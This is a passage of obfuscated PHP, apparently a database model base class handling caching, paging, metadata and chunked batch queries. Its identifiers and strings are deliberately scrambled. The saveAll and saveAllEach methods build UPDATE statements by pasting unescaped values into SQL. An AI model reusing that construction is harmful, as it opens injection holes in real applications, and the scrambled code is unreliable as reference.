Ñ“¥Ò = call_user_func_array(array($this, $ìú„×ú¿), array($¬ëÕÕŒî, !0)); Cache::set($Ÿ‚ùñÔÅ, $Ç Ñ“¥Ò); } return $Ç Ñ“¥Ò; } public function cacheFunctionClear($äíÜ‰î”, $£áÉˆùÖ) { $ª¯ßîüä = $£áÉˆùÖ; if (!is_array($£áÉˆùÖ)) { $ª¯ßîüä = array($£áÉˆùÖ); } foreach ($ª¯ßîüä as $ƒÑ¤¨ı¯) { $Ñ¥Î¥éÓ = $this->cacheKeyMake($äíÜ‰î”, $ƒÑ¤¨ı¯); Cache::remove($Ñ¥Î¥éÓ); } } private function cacheKeyMake($ó½å§Ã, $¸´äŒÑé) { $Ç§·ÑÜœ =& $_SERVER[³Ôà×Ó]; return get_class($this) . $Ç§·ÑÜœ[11] . $ó½å§Ã . $Ç§·ÑÜœ[446] . $¸´äŒÑé; } protected function selectPageReset() { $˜ûáíúº =& $_SERVER[³Ôà×Ó]; if (isset($GLOBALS[$˜ûáíúº[447]])) { return; } $GLOBALS[$˜ûáíúº[447]] = isset($GLOBALS[$˜ûáíúº[7]][$˜ûáíúº[448]]) ? $GLOBALS[$˜ûáíúº[7]][$˜ûáíúº[448]] : !1; $GLOBALS[$˜ûáíúº[449]] = isset($GLOBALS[$˜ûáíúº[7]][$˜ûáíúº[429]]) ? $GLOBALS[$˜ûáíúº[7]][$˜ûáíúº[429]] : !1; $GLOBALS[$˜ûáíúº[7]][$˜ûáíúº[448]] = !1; $GLOBALS[$˜ûáíúº[7]][$˜ûáíúº[429]] = !1; } protected function selectPageRestore() { $Ø“æ¾Éš =& $_SERVER[³Ôà×Ó]; if (!isset($GLOBALS[$Ø“æ¾Éš[447]])) { return; } $GLOBALS[$Ø“æ¾Éš[7]][$Ø“æ¾Éš[448]] = $GLOBALS[$Ø“æ¾Éš[447]]; $GLOBALS[$Ø“æ¾Éš[7]][$Ø“æ¾Éš[429]] = $GLOBALS[$Ø“æ¾Éš[449]]; if ($GLOBALS[$Ø“æ¾Éš[7]][$Ø“æ¾Éš[448]] === !1) { unset($GLOBALS[$Ø“æ¾Éš[7]][$Ø“æ¾Éš[448]]); } if ($GLOBALS[$Ø“æ¾Éš[7]][$Ø“æ¾Éš[429]] === !1) { unset($GLOBALS[$Ø“æ¾Éš[7]][$Ø“æ¾Éš[429]]); } unset($GLOBALS[$Ø“æ¾Éš[447]]); unset($GLOBALS[$Ø“æ¾Éš[449]]); } protected function selectPage($¤†å¶¨ã = 200, $ç·—³¾Í = 1) { $§­üİş± =& $_SERVER[³Ôà×Ó]; global $in; $æÃÕ…ùé = $this->optionsValue(); $ñŸ¦äÙ‡ = 50000; $¤†å¶¨ã = isset($in[$§­üİş±[448]]) && $in[$§­üİş±[448]] ? $in[$§­üİş±[448]] : $¤†å¶¨ã; if ($¤†å¶¨ã === -1) { $in[$§­üİş±[448]] = !1; $ñŸ¦äÙ‡ = 100000000; $¤†å¶¨ã = $ñŸ¦äÙ‡; } $î«ôï¢Â = $æÃÕ…ùé; $î«ôï¢Â[$§­üİş±[450]] = array(); $¤†å¶¨ã = intval($¤†å¶¨ã); $¤†å¶¨ã = $¤†å¶¨ã <= 5 ? 5 : ($¤†å¶¨ã >= $ñŸ¦äÙ‡ ? $ñŸ¦äÙ‡ : $¤†å¶¨ã); $ç·—³¾Í = intval(isset($in[$§­üİş±[429]]) && $in[$§­üİş±[429]] ? $in[$§­üİş±[429]] : $ç·—³¾Í); $ç·—³¾Í = $ç·—³¾Í <= 1 ? 1 : $ç·—³¾Í; $¨Åí¯æß = array(); $ß‚ÆÍñ¤ = 1; if ($ç·—³¾Í == 1 && $ß‚ÆÍñ¤) { $this->optionsValue($æÃÕ…ùé); $¨Åí¯æß = $this->page($ç·—³¾Í, $¤†å¶¨ã)->select(); $±Ù…î× = is_array($¨Åí¯æß) ? count($¨Åí¯æß) : 0; if ($±Ù…î× < $¤†å¶¨ã) { $’µºÌ¶Ë = 1; } else { $this->optionsValue($î«ôï¢Â); $±Ù…î× = intval($this->count()); $’µºÌ¶Ë = ceil($±Ù…î× / $¤†å¶¨ã); } } else { $this->optionsValue($î«ôï¢Â); $±Ù…î× = intval($this->count()); $’µºÌ¶Ë = ceil($±Ù…î× / $¤†å¶¨ã); $ç·—³¾Í = $ç·—³¾Í >= $’µºÌ¶Ë ? $’µºÌ¶Ë : $ç·—³¾Í; $this->optionsValue($æÃÕ…ùé); $¨Åí¯æß = $this->page($ç·—³¾Í, $¤†å¶¨ã)->select(); } if (!is_array($¨Åí¯æß)) { $¨Åí¯æß = array(); } if ($’µºÌ¶Ë == 1) { $±Ù…î× = count($¨Åí¯æß); } $Üê÷ô¾¦ = array($§­üİş±[451] => array($§­üİş±[452] => $±Ù…î×, $§­üİş±[448] => $¤†å¶¨ã, $§­üİş±[429] => $ç·—³¾Í, $§­üİş±[453] => $’µºÌ¶Ë), $§­üİş±[454] => $¨Åí¯æß); return $Üê÷ô¾¦; } protected function checkLength($³È‹ş, $‡´È´íµ = 0, $¼½¯ï×ç = '') { $ûÎ®ù˜ =& $_SERVER[³Ôà×Ó]; $‡´È´íµ = $‡´È´íµ ? $‡´È´íµ : 65536; if (!$³È‹ş || strlen($³È‹ş) < $‡´È´íµ) { return; } $¼½¯ï×ç = $¼½¯ï×ç ? $¼½¯ï×ç . $ûÎ®ù˜[74] : $ûÎ®ù˜[12]; show_json($¼½¯ï×ç . LNG($ûÎ®ù˜[455]) . "\x28{$‡´È´íµ}\x29", !1); } protected function metaSet($ó·ÂÑïÅ, $¹ş–¹ = null, $ ©Ç°† = null) { $æ¡ûöèƒ =& $_SERVER[³Ôà×Ó]; if (!$this->tableMeta || !$ó·ÂÑïÅ) { return !1; } $€ã÷¨ÄÍ = $this->tableMeta[$æ¡ûöèƒ[456]]; $Ö¾É¼Ğ¢ = $this->tableMeta[$æ¡ûöèƒ[457]]; $°ÇªÚ• = Model($Ö¾É¼Ğ¢); $•ŠÍ¼Êæ = array($€ã÷¨ÄÍ => $ó·ÂÑïÅ, $æ¡ûöèƒ[458] => $¹ş–¹); if (is_null($¹ş–¹)) { return $°ÇªÚ•->where(array($€ã÷¨ÄÍ => $ó·ÂÑïÅ))->delete(); } if (is_null($ ©Ç°†) && is_string($¹ş–¹)) { return $°ÇªÚ•->where($•ŠÍ¼Êæ)->delete(); } $˜øÄ¥‡ƒ = is_array($¹ş–¹) ? $¹ş–¹ : array(); if (is_string($¹ş–¹)) { $˜øÄ¥‡ƒ[$¹ş–¹] = $ ©Ç°†; } $ÑˆıÁï« = array(); foreach ($˜øÄ¥‡ƒ as $€ƒª£µ‡ => $ÔîõÈÏŞ) { if (is_null($ÔîõÈÏŞ) && is_string($€ƒª£µ‡)) { $°ÇªÚ•->where(array($€ã÷¨ÄÍ => $ó·ÂÑïÅ, $æ¡ûöèƒ[458] => $€ƒª£µ‡))->delete(); continue; } $this->checkLength($ÔîõÈÏŞ, !1, $Ö¾É¼Ğ¢ . $æ¡ûöèƒ[4] . $€ƒª£µ‡); $ÑˆıÁï«[] = array($€ã÷¨ÄÍ => $ó·ÂÑïÅ, $æ¡ûöèƒ[97] => $€ƒª£µ‡, $æ¡ûöèƒ[459] => $ÔîõÈÏŞ); } $Ò•ëË› = $æ¡ûöèƒ[460] . $Ö¾É¼Ğ¢; CacheLock::lock($Ò•ëË›); $°ÇªÚ•->where(array($€ã÷¨ÄÍ => $ó·ÂÑïÅ))->addAll($ÑˆıÁï«, array(), !0); CacheLock::unlock($Ò•ëË›); return !0; } public function metaGet($Ï³Í’ –, $æÀİæş = false) { $Š¥éâ =& $_SERVER[³Ôà×Ó]; if (!$this->tableMeta) { return array(); } $õïªÄä– = $this->tableMeta[$Š¥éâ[456]]; $€’ÜÈÂÒ = Model($this->tableMeta[$Š¥éâ[457]]); if ($æÀİæş) { $õŠÀù‹ = array($õïªÄä– => $Ï³Í’ –, $Š¥éâ[97] => $æÀİæş); return $€’ÜÈÂÒ->where($õŠÀù‹)->getField($Š¥éâ[459]); } $õŠÀù‹ = array($õïªÄä– => $Ï³Í’ –); $Å‰ğ‹§’ = $€’ÜÈÂÒ->field($Š¥éâ[461])->where($õŠÀù‹)->select(); $Å‰ğ‹§’ = array_to_keyvalue($Å‰ğ‹§’, $Š¥éâ[97], $Š¥éâ[459]); return $Å‰ğ‹§’; } private function checkDataAutoHas($Ã‡± ÑÒ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Êˆ®Ê) { if (in_array($Ã‡± ÑÒ, explode($_SERVER[³Ôà×Ó][50], $Êˆ®Ê[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$şÇèõçŸ, $›ï… ´ ) { $…Ü†ª‹ =& $_SERVER[³Ôà×Ó]; if (!is_array($şÇèõçŸ)) { return; } foreach ($this->dataAuto as $¶‰ú†àÏ) { $‘•˜ˆÖ = $¶‰ú†àÏ[0]; if (!in_array($›ï… ´ , explode($…Ü†ª‹[50], $¶‰ú†àÏ[2]))) { continue; } switch (trim($¶‰ú†àÏ[3])) { case $…Ü†ª‹[397]: case $…Ü†ª‹[398]: $×ÎÙ¼µƒ = $¶‰ú†àÏ[1]; $ë¡ÖïĞ = isset($¶‰ú†àÏ[4]) ? (array) $¶‰ú†àÏ[4] : array(); if ($×ÎÙ¼µƒ == $…Ü†ª‹[206] && array_key_exists($‘•˜ˆÖ, $şÇèõçŸ)) { if (!$şÇèõçŸ[$‘•˜ˆÖ]) { unset($şÇèõçŸ[$‘•˜ˆÖ]); } break; } if (isset($şÇèõçŸ[$‘•˜ˆÖ])) { array_unshift($ë¡ÖïĞ, $şÇèõçŸ[$‘•˜ˆÖ]); } if ($…Ü†ª‹[397] == $¶‰ú†àÏ[3]) { $şÇèõçŸ[$‘•˜ˆÖ] = call_user_func_array($×ÎÙ¼µƒ, $ë¡ÖïĞ); } else { $şÇèõçŸ[$‘•˜ˆÖ] = call_user_func_array(array(&$this, $×ÎÙ¼µƒ), $ë¡ÖïĞ); } break; case $…Ü†ª‹[347]: if (isset($şÇèõçŸ[$‘•˜ˆÖ]) && $şÇèõçŸ[$‘•˜ˆÖ]) { $şÇèõçŸ[$‘•˜ˆÖ] = call_user_func_array(array(&$this, $¶‰ú†àÏ[1]), array($şÇèõçŸ[$‘•˜ˆÖ])); } break; case $…Ü†ª‹[350]: $şÇèõçŸ[$‘•˜ˆÖ] = $şÇèõçŸ[$¶‰ú†àÏ[1]]; break; case $…Ü†ª‹[370]: if (isset($şÇèõçŸ[$‘•˜ˆÖ]) && !is_string($şÇèõçŸ[$‘•˜ˆÖ])) { $şÇèõçŸ[$‘•˜ˆÖ] = json_encode_force($şÇèõçŸ[$‘•˜ˆÖ]); } break; case $…Ü†ª‹[399]: if ($şÇèõçŸ[$‘•˜ˆÖ] === $…Ü†ª‹[12]) { unset($şÇèõçŸ[$‘•˜ˆÖ]); } break; case $…Ü†ª‹[400]: $şÇèõçŸ[$‘•˜ˆÖ] = $¶‰ú†àÏ[1]; default: break; } } if ($›ï… ´  == $…Ü†ª‹[440]) { $°˜ºüëô = strtolower($this->db->getDbType()); if (strpos($°˜ºüëô, $…Ü†ª‹[13]) !== 0) { return; } $õ¹‰ğÂ„ = $this->field(!0)->fields; $œ¢«ùÂ = $õ¹‰ğÂ„[$…Ü†ª‹[329]]; if (isset($õ¹‰ğÂ„[$…Ü†ª‹[328]])) { unset($œ¢«ùÂ[$õ¹‰ğÂ„[$…Ü†ª‹[328]]]); } foreach ($œ¢«ùÂ as $¿îã¡© => $›ï… ´ ) { if (!isset($şÇèõçŸ[$¿îã¡©])) { $şÇèõçŸ[$¿îã¡©] = $…Ü†ª‹[12]; } } } } private function dataAfterFilter(&$¡ƒÄº) { $‡ßÉ¦¸ˆ =& $_SERVER[³Ôà×Ó]; foreach ($this->dataAuto as $™êÈı§˜) { $œÀŠë¶Œ = $™êÈı§˜[0]; if (!isset($¡ƒÄº[$œÀŠë¶Œ])) { continue; } if (!in_array($‡ßÉ¦¸ˆ[442], explode($‡ßÉ¦¸ˆ[50], $™êÈı§˜[2]))) { continue; } switch (trim($™êÈı§˜[3])) { case $‡ßÉ¦¸ˆ[397]: case $‡ßÉ¦¸ˆ[398]: $Íñıã = isset($™êÈı§˜[4]) ? (array) $™êÈı§˜[4] : array(); array_unshift($Íñıã, $¡ƒÄº[$œÀŠë¶Œ]); if (isset($™êÈı§˜[4]) && $™êÈı§˜[4] == $‡ßÉ¦¸ˆ[462]) { $Íñıã = array($¡ƒÄº[$œÀŠë¶Œ]); } if ($‡ßÉ¦¸ˆ[397] == $™êÈı§˜[3]) { $¡ƒÄº[$œÀŠë¶Œ] = call_user_func_array($™êÈı§˜[1], $Íñıã); } else { $¡ƒÄº[$œÀŠë¶Œ] = call_user_func_array(array(&$this, $™êÈı§˜[1]), $Íñıã); } break; case $‡ßÉ¦¸ˆ[347]: if (isset($¡ƒÄº[$œÀŠë¶Œ]) && $¡ƒÄº[$œÀŠë¶Œ]) { $¡ƒÄº[$œÀŠë¶Œ] = call_user_func_array(array(&$this, $™êÈı§˜[1]), array($¡ƒÄº[$œÀŠë¶Œ])); } break; case $‡ßÉ¦¸ˆ[350]: $¡ƒÄº[$œÀŠë¶Œ] = $¡ƒÄº[$™êÈı§˜[1]]; break; case $‡ßÉ¦¸ˆ[370]: $ª¢ÄˆØ› = $¡ƒÄº[$œÀŠë¶Œ]; $¡ƒÄº[$œÀŠë¶Œ] = json_decode($ª¢ÄˆØ›, !0); if (is_null($¡ƒÄº[$œÀŠë¶Œ])) { $¡ƒÄº[$œÀŠë¶Œ] = $ª¢ÄˆØ›; } break; case $‡ßÉ¦¸ˆ[399]: if ($¡ƒÄº[$œÀŠë¶Œ] === $‡ßÉ¦¸ˆ[12]) { unset($¡ƒÄº[$œÀŠë¶Œ]); } break; case $‡ßÉ¦¸ˆ[400]: $¡ƒÄº[$œÀŠë¶Œ] = $™êÈı§˜[1]; break; default: break; } } } public function saveAll($Šï¦Ÿ¦ß) { $Ÿ½óªä =& $_SERVER[³Ôà×Ó]; $àøêãÊ« = $this->tablePrefix . $this->tableName; $ÀÆåø¥ = self::SQL_WHERE_IN_CHUNK; $Šï¦Ÿ¦ß = is_array($Šï¦Ÿ¦ß) ? $Šï¦Ÿ¦ß : array(); $ª»Òü¦Ö = $Ÿ½óªä[463]; $ÖÙ—Ÿ‚Ø = 0; $€ãƒòò = array(); $×Ê²§ŠÄ = count($Šï¦Ÿ¦ß); for ($ªŠÈŸ‡ = 0; $ªŠÈŸ‡ < $×Ê²§ŠÄ; $ªŠÈŸ‡++) { $’è½†½¹ = $Šï¦Ÿ¦ß[$ªŠÈŸ‡]; if (!is_array($’è½†½¹) || count($’è½†½¹) != 4) { continue; } $Ö´­æ´ = "\x55\120\x44\101\x54\x45\x20\140{$àøêãÊ«}\x60\x20\x53\x45\x54\x20{$’è½†½¹[2]}\40\75\40\x43\x41\123\105\x20{$’è½†½¹[0]}\40\12"; if ($ÖÙ—Ÿ‚Ø == 0) { $ª»Òü¦Ö = $Ö´­æ´; } $€ãƒòò[] = $Ÿ½óªä[121] . $’è½†½¹[1] . $Ÿ½óªä[121]; $ÖÙ—Ÿ‚Ø++; $ª»Òü¦Ö .= "\x20\x57\110\105\116\x20\x27{$’è½†½¹[1]}\x27\40\124\x48\x45\116\x20\x27{$’è½†½¹[3]}\x27\x20\xa"; if ($ÖÙ—Ÿ‚Ø == $ÀÆåø¥ || $ªŠÈŸ‡ == $×Ê²§ŠÄ - 1) { $’½¡‹¶… = implode($Ÿ½óªä[50], $€ãƒòò); $ª»Òü¦Ö .= "\x20\x45\116\x44\x20\40\x57\x48\105\122\x45\40{$’è½†½¹[0]}\x20\x49\116\x20\50{$’½¡‹¶…}\51\40"; $this->execute($ª»Òü¦Ö); $ÖÙ—Ÿ‚Ø = 0; $ª»Òü¦Ö = $Ö´­æ´; $this->chunkEventCheck(count($€ãƒòò)); $€ãƒòò = array(); } } $this->chunkEventSet(); } public function saveAllEach($ñú÷™²) { $Üš»®Ÿ =& $_SERVER[³Ôà×Ó]; $ûâ¢ƒ¶ = $this->tablePrefix . $this->tableName; foreach ($ñú÷™² as $·şÇÒİš) { if (!is_array($·şÇÒİš) || count($·şÇÒİš) != 4) { continue; } $œÂ®¹ ‘ = $·şÇÒİš[0] . $Üš»®Ÿ[464] . $·şÇÒİš[1] . $Üš»®Ÿ[121]; $´Ëéƒ€Ş = $·şÇÒİš[2] . $Üš»®Ÿ[464] . $·şÇÒİš[3] . $Üš»®Ÿ[121]; $ÁĞºÛ = "\165\160\x64\141\164\145\x20{$ûâ¢ƒ¶}\40\x73\x65\164\40{$´Ëéƒ€Ş}\40\167\x68\145\x72\x65\x20{$œÂ®¹ ‘}\x3b"; $this->execute($ÁĞºÛ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($”•Â§û = false, $“·‘âñÕ = false) { $this->_chunkEvent = $”•Â§û; $this->_chunkEventParam = $“·‘âñÕ; } private function chunkEventCheck($¼Á—¤ˆ¦) { if (!$this->_chunkEvent) { return; } $ÕªĞĞöã = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ÕªĞĞöã[$_SERVER[³Ôà×Ó][465]] = $¼Á—¤ˆ¦; Hook::trigger($this->_chunkEvent, $ÕªĞĞöã); } public function addAll($ˆÆ›Õ‡, $¡“˜æé = array(), $ÉÀñ›Ñ­ = false) { $éá€¦ªò =& $_SERVER[³Ôà×Ó]; ignore_timeout(); $óõ™Íü = self::SQL_WHERE_IN_CHUNK; if (empty($ˆÆ›Õ‡)) { $this->error = think_lang($éá€¦ªò[348]); return !1; } $¡“˜æé = $this->_parseOptions($¡“˜æé); foreach ($ˆÆ›Õ‡ as $¡¼…íğÎ => $ÛøÀ¾Ö) { $ˆÆ›Õ‡[$¡¼…íğÎ] = $this->_facade($ÛøÀ¾Ö); $this->_beforeInsert($ˆÆ›Õ‡[$¡¼…íğÎ], $¡“˜æé); } if (method_exists($this->db, $éá€¦ªò[349])) { for ($ëÉ–çúÄ = 0; $ëÉ–çúÄ < count($ˆÆ›Õ‡); $ëÉ–çúÄ += $óõ™Íü) { $ãÀªûµ = array_slice($ˆÆ›Õ‡, $ëÉ–çúÄ, $óõ™Íü); if (!is_array($ãÀªûµ) || count($ãÀªûµ) == 0) { break; } $˜äØÎÆ = $this->db->insertAll($ãÀªûµ, $¡“˜æé, $ÉÀñ›Ñ­); $this->chunkEventCheck(count($ãÀªûµ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ˆÆ›Õ‡ as $¡¼…íğÎ => $ÛøÀ¾Ö) { $˜äØÎÆ = $this->db->insert($ÛøÀ¾Ö, $¡“˜æé, $ÉÀñ›Ñ­); } $this->commit(); } if (!1 !== $˜äØÎÆ) { $åç¥ Äœ = $this->getLastInsID(); if ($åç¥ Äœ) { return $åç¥ Äœ; } } return $˜äØÎÆ; } public function save($—õò³„« = '', $èŠì•²Š = array()) { $ãàüƒµ =& $_SERVER[³Ôà×Ó]; $¹–­Æş¥ = self::SQL_WHERE_IN_CHUNK; $êä ‰” = $this->optionsValue(); $å¤†¢…´ = $this->findWhereField($êä ‰”); if (!$å¤†¢…´) { return parent::save($—õò³„«, $èŠì•²Š); } $‚ë»ˆô° = 0; $‚şÅ‚Åª = $êä ‰”[$ãàüƒµ[352]][$å¤†¢…´][1]; $‚şÅ‚Åª = is_array($‚şÅ‚Åª) ? $‚şÅ‚Åª : array(); $üçı–øü = count($‚şÅ‚Åª); for ($¨‹¶Šå’ = 0; $¨‹¶Šå’ < $üçı–øü; $¨‹¶Šå’ += $¹–­Æş¥) { $Ê³Õìö• = array_slice($‚şÅ‚Åª, $¨‹¶Šå’, $¹–­Æş¥); if (!is_array($Ê³Õìö•) || count($Ê³Õìö•) == 0) { break; } $êä ‰”[$ãàüƒµ[352]][$å¤†¢…´][1] = $Ê³Õìö•; $this->optionsValue($êä ‰”); $‚ë»ˆô° += parent::save($—õò³„«, $èŠì•²Š); $this->chunkEventCheck(count($Ê³Õìö•)); } $this->chunkEventSet(); return $‚ë»ˆô°; } public function add($¶Íğ€Ãã = '', $¬§©õËú = array(), $§ƒïõ = false) { if ($this->addTaskStatus && is_array($¶Íğ€Ãã)) { $this->addTaskData[] = $¶Íğ€Ãã; return; } return parent::add($¶Íğ€Ãã, $¬§©õËú, $§ƒïõ); } public function parseWhereLike($óê´Àîë, $ƒô×ŞÏÈ = '', $ÛÚÓ»Ş´ = false, &$¼‘¶Ô«÷ = false) { $è¢ˆˆÎŸ =& $_SERVER[³Ôà×Ó]; $ÊÆÎï¡Ü = $GLOBALS[$è¢ˆˆÎŸ[6]][$è¢ˆˆÎŸ[466]]; if (!$ÊÆÎï¡Ü[$è¢ˆˆÎŸ[467]]) { return $óê´Àîë; } if (!is_array($óê´Àîë)) { return $óê´Àîë; } $µÂªñ”é = array(); $Í«ªöà¯ = 0; foreach ($óê´Àîë as $û‘¢ö‹Ö => $î‹’‰ßŸ) { if (is_array($î‹’‰ßŸ) && count($î‹’‰ßŸ) == 2 && $î‹’‰ßŸ[0] == $è¢ˆˆÎŸ[468] && is_string($î‹’‰ßŸ[1]) && substr($î‹’‰ßŸ[1], 0, 1) == $è¢ˆˆÎŸ[469] && substr($î‹’‰ßŸ[1], strlen($î‹’‰ßŸ[1]) - 1, 1) == $è¢ˆˆÎŸ[469]) { $¼‘¶Ô«÷ = !0; $öø…Ó•Ó = is_string($û‘¢ö‹Ö) ? $û‘¢ö‹Ö : $ƒô×ŞÏÈ; $…óôØ÷Ç = substr($î‹’‰ßŸ[1], 1, strlen($î‹’‰ßŸ[1]) - 2); $…óôØ÷Ç = $this->db->escapeString($…óôØ÷Ç); if (!strpos($öø…Ó•Ó, $è¢ˆˆÎŸ[10])) { $öø…Ó•Ó = $è¢ˆˆÎŸ[470] . $öø…Ó•Ó . $è¢ˆˆÎŸ[470]; } $éõıé½‰ = $è¢ˆˆÎŸ[220] . $…óôØ÷Ç . $è¢ˆˆÎŸ[220]; $…óôØ÷Ç = str_replace(array($è¢ˆˆÎŸ[10], $è¢ˆˆÎŸ[471], $è¢ˆˆÎŸ[11]), $è¢ˆˆÎŸ[472], $…óôØ÷Ç); if ($ÊÆÎï¡Ü[$è¢ˆˆÎŸ[473]]) { $éõıé½‰ = $è¢ˆˆÎŸ[474] . $…óôØ÷Ç . $è¢ˆˆÎŸ[475]; if ($ÊÆÎï¡Ü[$è¢ˆˆÎŸ[476]]) { $éõıé½‰ = $è¢ˆˆÎŸ[475] . $…óôØ÷Ç . $è¢ˆˆÎŸ[474]; } } $µÂªñ”é[$Í«ªöà¯] = $è¢ˆˆÎŸ[477] . $öø…Ó•Ó . $è¢ˆˆÎŸ[478] . $éõıé½‰ . $è¢ˆˆÎŸ[479]; $Í«ªöà¯++; continue; } if (is_array($î‹’‰ßŸ)) { $ƒô×ŞÏÈ = is_string($û‘¢ö‹Ö) ? $û‘¢ö‹Ö : $ƒô×ŞÏÈ; $î‹’‰ßŸ = $this->parseWhereLike($î‹’‰ßŸ, $ƒô×ŞÏÈ, !0, $¼‘¶Ô«÷); } if (is_numeric($û‘¢ö‹Ö)) { $µÂªñ”é[$Í«ªöà¯] = $î‹’‰ßŸ; $Í«ªöà¯++; } else { $µÂªñ”é[$û‘¢ö‹Ö] = $î‹’‰ßŸ; } } if ($¼‘¶Ô«÷ && !$ÛÚÓ»Ş´) { } return $µÂªñ”é; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($¤Â°æ† = array()) { $şš©½Ïœ =& $_SERVER[³Ôà×Ó]; $à‹Âœºœ = self::SQL_WHERE_IN_CHUNK; $ÓÚÑÊ¦— = $this->optionsValue(); $Ú–Ù›‹ = $this->findWhereField($ÓÚÑÊ¦—); if (!$Ú–Ù›‹ || isset($ÓÚÑÊ¦—[$şš©½Ïœ[368]]) || isset($ÓÚÑÊ¦—[$şš©½Ïœ[429]])) { return parent::select($¤Â°æ†); } $ëéŞÑöĞ = $ÓÚÑÊ¦—[$şš©½Ïœ[352]][$Ú–Ù›‹][1]; $ëéŞÑöĞ = is_array($ëéŞÑöĞ) ? $ëéŞÑöĞ : array(); $™ğ×ÙÊ‚ = null; for ($Ã´“ = 0; $Ã´“ < count($ëéŞÑöĞ); $Ã´“ += $à‹Âœºœ) { $’¤Ä¿ÚÕ = array_slice($ëéŞÑöĞ, $Ã´“, $à‹Âœºœ); if (!is_array($’¤Ä¿ÚÕ) || count($’¤Ä¿ÚÕ) == 0) { break; } $ÓÚÑÊ¦—[$şš©½Ïœ[352]][$Ú–Ù›‹][1] = $’¤Ä¿ÚÕ; $this->optionsValue($ÓÚÑÊ¦—); $•Ÿúßë« = parent::select($¤Â°æ†); if (!$•Ÿúßë«) { continue; } $™ğ×ÙÊ‚ = is_array($™ğ×ÙÊ‚) ? $™ğ×ÙÊ‚ : array(); $™ğ×ÙÊ‚ = array_merge($™ğ×ÙÊ‚, $•Ÿúßë«); } return $™ğ×ÙÊ‚; } public function delete($ğ·‰ˆ‹å = array()) { $¯‡ÍÑÑñ =& $_SERVER[³Ôà×Ó]; $ÌŸáğ¨ = self::SQL_WHERE_IN_CHUNK; $¨Ö¶£ë« = $this->optionsValue(); $È×Êñê = $this->findWhereField($¨Ö¶£ë«); if (!$È×Êñê) { return parent::delete($ğ·‰ˆ‹å); } $¤­ÈƒÃÆ = 0; $¸Û˜ÅÍ = $¨Ö¶£ë«[$¯‡ÍÑÑñ[352]][$È×Êñê][1]; $¸Û˜ÅÍ = is_array($¸Û˜ÅÍ) ? $¸Û˜ÅÍ : array(); for ($ËÒöÏ§¹ = 0; $ËÒöÏ§¹ < count($¸Û˜ÅÍ); $ËÒöÏ§¹ += $ÌŸáğ¨) { $¥çûÓ» = array_slice($¸Û˜ÅÍ, $ËÒöÏ§¹, $ÌŸáğ¨); if (!is_array($¥çûÓ») || count($¥çûÓ») == 0) { break; } $¨Ö¶£ë«[$¯‡ÍÑÑñ[352]][$È×Êñê][1] = $¥çûÓ»; $this->optionsValue($¨Ö¶£ë«); $¤­ÈƒÃÆ += parent::delete($ğ·‰ˆ‹å); } return $¤­ÈƒÃÆ; } private function findWhereField($’†¥üÒ‡) { $£»®ëà =& $_SERVER[³Ôà×Ó]; $–ÈÊö—É = self::SQL_WHERE_IN_CHUNK; if (!is_array($’†¥üÒ‡) || !is_array($’†¥üÒ‡[$£»®ëà[352]])) { return !1; } foreach ($’†¥üÒ‡[$£»®ëà[352]] as $‚İµß­¸ => $Æˆ´û²) { if (is_array($Æˆ´û²) && isset($Æˆ´û²[0]) && is_string($Æˆ´û²[0]) && strtolower($Æˆ´û²[0]) == $£»®ëà[7] && is_array($Æˆ´û²[1]) && count($Æˆ´û²[1]) > $–ÈÊö—É) { ignore_timeout(); return $‚İµß­¸; } } return !1; } public function setMasterDB($ƒÓ›š¶ = true) { think_config($_SERVER[³Ôà×Ó][480], $ƒÓ›š¶); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\x73\x74\145\155\117\160\164\151\x6f\x6e"; public $field = array(); public function listData($Êâ¿“”£ = false, $¼¡ÊàÅ˜ = "\155\157\144\151\146\x79\x54\x69\155\145", $°¿¹æš = false) { $´«¨ÒÁ½ = Model($this->modelType)->get(!1, $this->optionType, !0); $öîê—  = array_values($´«¨ÒÁ½); if ($öîê—  && $öîê— [0] && !is_array($öîê— [0])) { Model($this->modelType)->cacheRemove($this->optionType); $´«¨ÒÁ½ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$´«¨ÒÁ½) { return $Êâ¿“”£ ? null : array(); } if (!$Êâ¿“”£) { $´«¨ÒÁ½ = array_filter(array_values($´«¨ÒÁ½)); return array_sort_by($´«¨ÒÁ½, $¼¡ÊàÅ˜, $°¿¹æš); } return $´«¨ÒÁ½[$_SERVER[³Ôà×Ó][481] . $Êâ¿“”£]; } public function insert($úÂÖ”¼è) { $±ñõ§Í¸ =& $_SERVER[³Ôà×Ó]; $úÂÖ”¼è = array_field_key($úÂÖ”¼è, $this->field); $·Ó”µí» = Model($this->modelType)->get($±ñõ§Í¸[482], $this->optionType . $±ñõ§Í¸[483]); $·Ó”µí» = $·Ó”µí» ? $·Ó”µí» : 0; $úÂÖ”¼è[$±ñõ§Í¸[484]] = ++$·Ó”µí»; $úÂÖ”¼è[$±ñõ§Í¸[231]] = time(); $úÂÖ”¼è[$±ñõ§Í¸[88]] = time(); Model($this->modelType)->set($±ñõ§Í¸[482], $·Ó”µí», $this->optionType . $±ñõ§Í¸[483]); Model($this->modelType)->set($±ñõ§Í¸[481] . $·Ó”µí», $úÂÖ”¼è, $this->optionType); return $·Ó”µí»; } public function update($é®¬ñ, $ú”Ğ‡ÍŞ) { $°¿¾¡Ü« =& $_SERVER[³Ôà×Ó]; $ú”Ğ‡ÍŞ = array_field_key($ú”Ğ‡ÍŞ, $this->field); $ßĞÍ•¤± = $this->listData($é®¬ñ); if (!$ßĞÍ•¤± || !$é®¬ñ) { return !1; } $ú”Ğ‡ÍŞ = array_merge($ßĞÍ•¤±, $ú”Ğ‡ÍŞ); $ú”Ğ‡ÍŞ[$°¿¾¡Ü«[88]] = time(); return Model($this->modelType)->set($°¿¾¡Ü«[481] . $é®¬ñ, $ú”Ğ‡ÍŞ, $this->optionType); } public function remove($¡Û³á³) { if (!$¡Û³á³) { return !1; } return Model($this->modelType)->remove($_SERVER[³Ôà×Ó][481] . $¡Û³á³, $this->optionType); } public function clear() { 